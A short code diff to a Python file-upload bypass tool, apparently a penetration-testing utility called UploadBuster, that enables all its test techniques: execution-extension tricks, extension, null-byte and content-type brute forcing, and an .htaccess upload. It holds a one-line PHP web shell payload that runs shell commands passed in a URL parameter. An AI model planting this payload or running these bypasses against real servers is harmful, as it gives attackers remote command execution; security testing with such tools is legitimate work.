@@ -221,8 +221,6 @@ class UploadBuster:
         upload_htaccess()
         upload_new_payload()
 
-
-
     def _tech_short_php_payload(self):
         self._set_payload_data("<?=`$_GET[x]`?>")
         self._change_payload_file_ext(".php")
@@ -301,14 +299,13 @@ class UploadBuster:
 
         elif self.args.all_tests:
             print("[+] Executing All tests ")
-            # self._tech_add_execution_extension()
+            self._tech_add_execution_extension()
             self._tech_short_php_payload()
-            # self._bruter_file_ext()
-            # self._bruter_null_file_ext()
-            # self._bruter_multi_ext()
-            # self._bruter_content_type()
-            # self._tech_add_execution_extension()
-            # self._bruter_filename_limit()
+            self._bruter_file_ext()
+            self._bruter_null_file_ext()
+            self._bruter_multi_ext()
+            self._bruter_content_type()
+            self._bruter_filename_limit()
 
 
 if __name__ == '__main__':
